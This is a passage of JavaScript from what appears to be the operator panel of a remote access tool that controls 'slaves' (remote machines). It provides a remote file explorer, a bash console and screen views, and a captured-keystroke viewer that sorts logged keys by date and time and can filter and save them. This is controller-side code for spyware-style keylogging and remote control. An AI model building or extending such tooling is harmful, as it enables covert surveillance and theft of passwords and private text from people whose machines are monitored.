      explorerEditor.hidden = false;
      explorerEditor.style.display = 'block';
      explorerEditor.style.width = '100%';
      explorerEditor.style.height = '100%';
      explorerEditor.style.minHeight = '240px';
      explorerEditor.style.boxSizing = 'border-box';
    }

    renderExplorerTree();
  }

  function closeExplorerViewer() {
    explorerOpenPath = null;
    if (explorerFileName) explorerFileName.textContent = '—';
    if (btnExplorerSave) btnExplorerSave.hidden = true;
    if (btnExplorerClose) btnExplorerClose.hidden = true;
    if (btnExplorerDownload) btnExplorerDownload.hidden = true;
    if (explorerImage) {
      explorerImage.removeAttribute('src');
      explorerImage.hidden = true;
    }
    if (cmEditor) {
      try { cmEditor.setValue(''); } catch (_) {}
    }
    if (explorerEditor) explorerEditor.value = '';
    showViewerPane('empty');
    renderExplorerTree();
  }


  on($('#btn-explorer-up'), 'click', () => callPython('on_open_folder', parentPath(explorerPath)));
  on($('#btn-explorer-new-file'), 'click', () => {
    const name = prompt('File name'); if (!name) return;
    callPython('on_create_item', joinPath(explorerPath, name), false);
  });
  on($('#btn-explorer-new-folder'), 'click', () => {
    const name = prompt('Folder name'); if (!name) return;
    callPython('on_create_item', joinPath(explorerPath, name), true);
  });
  on($('#btn-explorer-refresh'), 'click', () => callPython('on_open_folder', explorerPath));
  on(btnExplorerSave, 'click', () => {
    if (!explorerOpenPath) return;
    callPython('on_save_file', explorerOpenPath, cmEditor ? cmEditor.getValue() : (explorerEditor && explorerEditor.value));
  });
  on(btnExplorerDownload, 'click', () => {
    if (!explorerOpenPath) return;
    callPython('on_file_download', explorerOpenPath);
  });
  on(btnExplorerClose, 'click', closeExplorerViewer);

  // KEYLOG — tree: { date: { hour: { minute: { tensOfSec: [keys] } } } }
  // tensOfSec: 0 → 0–9s, 1 → 10–19s, … 5 → 50–59s
  function setKeyLog(data) {
    keylogSelected.clear();
    keylogFlatCache = [];
    if (!data) {
      keylogTree = {};
    } else if (Array.isArray(data)) {
      keylogTree = {};
      data.forEach((e) => {
        const t = String(e.time || '');
        let date = 'unknown', h = '00', mi = '00', tens = '0';
        if (t.includes('T')) {
          const [d, rest] = t.split('T');
          date = d || date;
          const parts = (rest || '').split(':');
          h = (parts[0] || '00').padStart(2, '0');
          mi = (parts[1] || '00').padStart(2, '0');
          const sec = parseInt((parts[2] || '0').split('.')[0], 10) || 0;
          tens = String(Math.floor(sec / 10));
        } else if (/^\d{4}-\d{2}-\d{2}/.test(t)) {
          date = t.slice(0, 10);
        }
        if (!keylogTree[date]) keylogTree[date] = {};
        if (!keylogTree[date][h]) keylogTree[date][h] = {};
        if (!keylogTree[date][h][mi]) keylogTree[date][h][mi] = {};
        if (!keylogTree[date][h][mi][tens]) keylogTree[date][h][mi][tens] = [];
        keylogTree[date][h][mi][tens].push(e.key != null ? String(e.key) : '');
      });
    } else if (typeof data === 'object') {
      keylogTree = data;
    } else {
      keylogTree = {};
    }
    if (btnKeylogSave) btnKeylogSave.disabled = true;
    renderKeyLog();
  }

  function keylogFilters() {
    return {
      date: ((keylogFilterDate && keylogFilterDate.value) || '').trim(),
      hour: ((keylogFilterHour && keylogFilterHour.value) || '').trim(),
      min: ((keylogFilterMin && keylogFilterMin.value) || '').trim(),
      sec: ((keylogFilterSec && keylogFilterSec.value) || '').trim(), // tens of seconds
      key: ((keylogFilterKey && keylogFilterKey.value) || '').trim().toLowerCase(),
    };
  }

  function keylogMatchNum(value, filter) {
    if (!filter) return true;
    return String(value) === String(filter)
      || String(Number(value)) === String(Number(filter))
      || String(value).padStart(2, '0') === String(filter).padStart(2, '0');
  }

  function countKeysIn(node) {
    if (Array.isArray(node)) return node.length;
    if (!node || typeof node !== 'object') return 0;
    let n = 0;
    Object.keys(node).forEach((k) => { n += countKeysIn(node[k]); });
    return n;
  }

  /** tens 0..5 → "0–9s" … "50–59s" */
  function tensLabel(tens) {
    const t = Number(tens);
    if (isNaN(t) || t < 0) return String(tens);
    const lo = t * 10;
    const hi = lo + 9;
    return lo + '–' + hi + 's';
  }

  function buildKeylogNode(level, id, label, fillBody, count) {
    const el = document.createElement('div');
    el.className = 'keylog-node';
    el.dataset.level = level;
    el.dataset.id = id;
    if (level === 'hour' || level === 'min') el.classList.add('collapsed');

    const header = document.createElement('div');
    header.className = 'keylog-node-header';
    header.innerHTML =
      '<span class="chevron">▼</span>' +
      '<span class="keylog-node-label">' + escapeHtml(String(label)) + '</span>' +
      (count != null ? '<span class="keylog-node-count">' + count + '</span>' : '');

    const body = document.createElement('div');
    body.className = 'keylog-node-body';

    on(header, 'click', (e) => {
      if (e.target.closest('input, label, button, .keylog-key-chip')) return;
      el.classList.toggle('collapsed');
    });

    el.appendChild(header);
    el.appendChild(body);
    if (typeof fillBody === 'function') {
      try { fillBody(body); } catch (err) { console.warn('[keylog]', level, id, err); }
    }
    return { el, body, header };
  }

  function renderKeyLog() {
    if (!keylogList) return;
    keylogList.innerHTML = '';
    keylogFlatCache = [];
    const f = keylogFilters();
    const tree = keylogTree || {};
    const dates = Object.keys(tree).sort();

    dates.forEach((date) => {
      if (f.date && !String(date).includes(f.date)) return;
      const hoursObj = tree[date];
      if (!hoursObj || typeof hoursObj !== 'object') return;

      const dateNode = buildKeylogNode('date', date, date, (dateBody) => {
        const hours = Object.keys(hoursObj).sort((a, b) => Number(a) - Number(b));
        hours.forEach((hour) => {
          if (f.hour && !keylogMatchNum(hour, f.hour)) return;
          const minsObj = hoursObj[hour];
          if (!minsObj || typeof minsObj !== 'object') return;

          const hourNode = buildKeylogNode(
            'hour',
            date + '|' + hour,
            String(hour).padStart(2, '0') + 'h',
            (hourBody) => {
              const mins = Object.keys(minsObj).sort((a, b) => Number(a) - Number(b));
              mins.forEach((min) => {
                if (f.min && !keylogMatchNum(min, f.min)) return;
                const tensObj = minsObj[min];
                if (!tensObj || typeof tensObj !== 'object') return;
                const minLabel =
                  String(hour).padStart(2, '0') + ':' + String(min).padStart(2, '0');

                const minNode = buildKeylogNode(
                  'min',
                  date + '|' + hour + '|' + min,
                  minLabel,
                  (minBody) => {
                    const tensList = Object.keys(tensObj).sort((a, b) => Number(a) - Number(b));
                    tensList.forEach((tens) => {
                      if (f.sec && !keylogMatchNum(tens, f.sec)) return;
                      let keys = tensObj[tens];
                      if (!Array.isArray(keys)) keys = [];
                      const filtered = f.key
                        ? keys.map((k, i) => ({ k, i })).filter(({ k }) => String(k).toLowerCase().includes(f.key))
                        : keys.map((k, i) => ({ k, i }));
                      if (!filtered.length) return;

                      const tensId = date + '|' + hour + '|' + min + '|' + tens;
                      const tensHdr =
                        minLabel + ' · ' + tensLabel(tens);

                      const tensNode = buildKeylogNode(
                        'sec', // CSS level name kept; means tens-of-seconds bucket
                        tensId,
                        tensHdr,
                        (tensBody) => {
                          const chips = document.createElement('div');
                          chips.className = 'keylog-keys';
                          filtered.forEach(({ k, i }) => {
                            const id = tensId + '|' + i;
                            const chip = document.createElement('span');
                            chip.className = 'keylog-key-chip' + (keylogSelected.has(id) ? ' selected' : '');
                            chip.textContent = String(k);
                            chip.title = 'click to select';
                            const entry = {
                              date: date,
                              hour: hour,
                              min: min,
                              tens: tens,
                              time:
                                date + 'T' +
                                String(hour).padStart(2, '0') + ':' +
                                String(min).padStart(2, '0') + ':' +
                                String(Number(tens) * 10).padStart(2, '0'),
                              key: k,
                            };
                            keylogFlatCache.push({ id: id, entry: entry });
                            on(chip, 'click', (e) => {
                              e.stopPropagation();
                              if (keylogSelected.has(id)) keylogSelected.delete(id);
                              else keylogSelected.add(id);
                              chip.classList.toggle('selected', keylogSelected.has(id));
                              if (btnKeylogSave) btnKeylogSave.disabled = keylogSelected.size === 0;
                            });
                            chips.appendChild(chip);
                          });
                          tensBody.appendChild(chips);
                        },
                        filtered.length
                      );

                      minBody.appendChild(tensNode.el);
                    });
                  },
                  countKeysIn(tensObj)
                );

                hourBody.appendChild(minNode.el);
              });
            },
            countKeysIn(minsObj)
          );

          dateBody.appendChild(hourNode.el);
        });
      }, countKeysIn(hoursObj));

      if (dateNode.body.children.length) keylogList.appendChild(dateNode.el);
    });

    const visibleChips = keylogList.querySelectorAll('.keylog-key-chip').length;
    const hasNodes = keylogList.querySelectorAll('.keylog-node').length > 0;
    if (keylogEmpty) keylogEmpty.classList.toggle('visible', !hasNodes);
    if (keylogMeta) {
      const total = countKeysIn(tree);
      keylogMeta.textContent = hasNodes
        ? (visibleChips + ' shown / ' + total + ' total')
        : (total ? total + ' (filtered)' : '—');
    }
  }

  function keylogSetCollapsed(collapsed) {
    if (!keylogList) return;
    keylogList.querySelectorAll('.keylog-node').forEach((n) => {
      if (!collapsed && n.dataset.level === 'date') n.classList.remove('collapsed');
      else n.classList.toggle('collapsed', collapsed);
    });
  }

  on(btnKeylogApply, 'click', () => {
    const f = keylogFilters();
    callPython('on_keylog_filter', f.date || null, f.hour || null, f.min || null, f.sec || null, f.key || null);
    callPython('onKeyLogTimeRangeSet', f.date || null, f.hour || null);
    renderKeyLog();
  });

  [keylogFilterDate, keylogFilterHour, keylogFilterMin, keylogFilterSec, keylogFilterKey].forEach((inp) => {
    on(inp, 'input', () => renderKeyLog());
    on(inp, 'keydown', (e) => {
      if (e.key === 'Enter') {
        e.preventDefault();
        if (btnKeylogApply) btnKeylogApply.click();
      }
    });
  });

  on(btnKeylogExpand, 'click', () => keylogSetCollapsed(false));
  on(btnKeylogCollapse, 'click', () => keylogSetCollapsed(true));

  on(btnKeylogSave, 'click', () => {
    const keys = keylogFlatCache
      .filter(({ id }) => keylogSelected.has(id))
      .map(({ entry }) => entry);
    callPython('onKeyLogSave', keys);
    callPython('on_keylog_save', keys);
  });





  // hotkeys
  document.addEventListener('keydown', (e) => {
    if (e.key === 'Escape') {
      if (drawer && drawer.classList.contains('open')) { closeDrawer(); e.preventDefault(); return; }
      if (explorerOpenPath) { closeExplorerViewer(); e.preventDefault(); return; }
      return;
    }
    if ((e.ctrlKey || e.metaKey) && (e.key === 'l' || e.key === 'L')) {
      if (app && !app.hidden) {
        e.preventDefault();
        switchPage('bash');
        setTimeout(() => bashInput && bashInput.focus(), 30);
      }
      return;
    }
    if (isTypingTarget(e.target)) return;
    if (app && app.hidden) return;
    if (e.ctrlKey || e.metaKey || e.altKey) return;
    const k = e.key;
    if (k >= '1' && k <= '5') {
      const page = PAGE_ORDER[Number(k) - 1];
      if (page) { switchPage(page); e.preventDefault(); }
      return;
    }
    if (k === 's' || k === 'S') { toggleDrawer(); e.preventDefault(); return; }
    if (k === 'r' || k === 'R') { doReconnect(); e.preventDefault(); return; }
  });

  // konami
  const konami = [38, 38, 40, 40, 37, 39, 37, 39, 66, 65];
  let kIdx = 0;
  document.addEventListener('keydown', (e) => {
    if (e.keyCode === konami[kIdx]) {
      kIdx++;
      if (kIdx === konami.length) {
        kIdx = 0;
        document.body.classList.toggle('gachi-mode');
        sendAnnounce(document.body.classList.contains('gachi-mode') ? '♂ Dungeon rank: GYMPROOF' : 'Returned to civilian form', 'success');
      }
    } else {
      kIdx = e.keyCode === konami[0] ? 1 : 0;
    }
  });

  const logoMark = $('#logo-mark') || $('.logo-mark');
  let logoClicks = 0, logoTimer = null;
  if (logoMark) {
    logoMark.style.cursor = 'pointer';
    on(logoMark, 'click', () => {
      logoClicks++;
      clearTimeout(logoTimer);
      logoTimer = setTimeout(() => { logoClicks = 0; }, 2000);
      if (logoClicks >= 7) {
        logoClicks = 0;
        sendAnnounce(GACHI_QUOTES[Math.floor(Math.random() * GACHI_QUOTES.length)], 'success');
      }
    });
  }


  /**
   * playSound(data [, mime])
   * data: raw base64, data URI, or double-base64 (base64 of a base64 string).
   * mime: default audio/wav if data looks like WAV, else audio/mpeg
   */
  let _soundAudio = null;

  function _b64ToBytes(b64) {
    const clean = String(b64).replace(/\s+/g, '');
    const bin = atob(clean);
    const bytes = new Uint8Array(bin.length);
    for (let i = 0; i < bin.length; i++) bytes[i] = bin.charCodeAt(i);
    return bytes;
  }

  function _bytesToB64(bytes) {
    let s = '';
    const chunk = 0x8000;
    for (let i = 0; i < bytes.length; i += chunk) {
      s += String.fromCharCode.apply(null, bytes.subarray(i, i + chunk));
    }
    return btoa(s);
  }

  function _sniffMime(bytes, fallback) {
    if (bytes.length >= 4) {
      // RIFF....WAVE
      if (bytes[0] === 0x52 && bytes[1] === 0x49 && bytes[2] === 0x46 && bytes[3] === 0x46) return 'audio/wav';
      // OggS
      if (bytes[0] === 0x4f && bytes[1] === 0x67 && bytes[2] === 0x67 && bytes[3] === 0x53) return 'audio/ogg';
      // ID3 or fffb mp3
      if (bytes[0] === 0x49 && bytes[1] === 0x44 && bytes[2] === 0x33) return 'audio/mpeg';
      if (bytes[0] === 0xff && (bytes[1] & 0xe0) === 0xe0) return 'audio/mpeg';
      // ftyp (m4a)
      if (bytes.length >= 8 && bytes[4] === 0x66 && bytes[5] === 0x74 && bytes[6] === 0x79 && bytes[7] === 0x70) return 'audio/mp4';
    }
    return fallback || 'audio/mpeg';
  }

  function _unwrapAudioBase64(raw) {
    // returns { b64, mimeHint } after undoing accidental double encoding
    let b64 = String(raw).replace(/\s+/g, '');
    let bytes;
    try {
      bytes = _b64ToBytes(b64);
    } catch (e) {
      throw new Error('invalid base64');
    }
    // double-encoded: decoded payload is ASCII base64 of real audio (e.g. starts with "UklGR" = RIFF)
    const asText = (() => {
      try {
        return new TextDecoder('ascii', { fatal: false }).decode(bytes);
      } catch (_) {
        return '';
      }
    })();
    if (/^[A-Za-z0-9+/=\r\n]+$/.test(asText.trim()) && asText.trim().length > 16) {
      // looks like base64 text — try second decode
      try {
        const inner = asText.replace(/\s+/g, '');
        const innerBytes = _b64ToBytes(inner);
        if (innerBytes.length > 12) {
          return { b64: inner, bytes: innerBytes, double: true };
        }
      } catch (_) {}
    }
    return { b64: b64, bytes: bytes, double: false };
  }

  function playSound(data, mime) {
    if (!data || typeof data !== 'string') return Promise.resolve(false);

    let src = data.trim();
    if (src.startsWith('data:') || src.startsWith('blob:') || src.startsWith('http://') || src.startsWith('https://')) {
      // already a URI
    } else {
      try {
        const un = _unwrapAudioBase64(src);
        const detected = _sniffMime(un.bytes, mime || 'audio/wav');
        src = 'data:' + detected + ';base64,' + un.b64;
        if (un.double) console.log('[playSound] unwrapped double base64 →', detected);
      } catch (e) {
        console.warn('[playSound] decode failed', e);
        sendAnnounce('Sound decode failed', 'error');
        return Promise.resolve(false);
      }
    }

    try {
      stopSound();
      _soundAudio = new Audio();
      _soundAudio.preload = 'auto';
      const audio = _soundAudio;
      return new Promise((resolve) => {
        const fail = (err) => {
          console.warn('[playSound]', err);
          sendAnnounce('Sound play failed', 'warn');
          resolve(false);
        };
        on(audio, 'error', () => fail(audio.error || 'audio error'));
        on(audio, 'canplaythrough', () => {
          audio.play().then(() => resolve(true)).catch(fail);
        }, { once: true });
        // fallback if canplaythrough doesn't fire
        setTimeout(() => {
          if (audio.readyState >= 2) {
            audio.play().then(() => resolve(true)).catch(fail);
          }
        }, 800);
        audio.src = src;
        audio.load();
      });
    } catch (e) {
      console.warn('[playSound]', e);
      sendAnnounce('Sound play failed', 'warn');
      return Promise.resolve(false);
    }
  }

  function stopSound() {
    if (_soundAudio) {
      try { _soundAudio.pause(); _soundAudio.currentTime = 0; _soundAudio.removeAttribute('src'); _soundAudio.load(); } catch (_) {}
      _soundAudio = null;
    }
  }


  window.setAuthenticated = setAuthenticated;
  window.setMaximized = setMaximized;
  window.sendAnnounce = sendAnnounce;
  window.setSlavesTree = setSlavesTree;
  window.setInfo = setInfo;
  window.setScreen = setScreen;
  window.appendBash = appendBash;
  window.clearBash = clearBash;
  window.setLoginError = setLoginError;
  window.setSlaveState = setSlaveState;
  window.setLocal = setLocal;
  window.setExplorerPath = setExplorerPath;
  window.setExplorerFile = setExplorerFile;
  window.setKeyLog = setKeyLog;
  window.playSound = playSound;
  window.stopSound = stopSound;

  window.DM = {
    setAuthenticated, setMaximized, sendAnnounce, setSlavesTree, setInfo, setScreen,
    appendBash, clearBash, setLoginError, openSlave, closeSlave, switchPage,
    setSlaveState, setLocal, setExplorerPath, setExplorerFile, setKeyLog, playSound, stopSound
  };

  updateNoSlaveHint();
  // CodeMirror inits lazily on first setExplorerFile (visible pane)
})();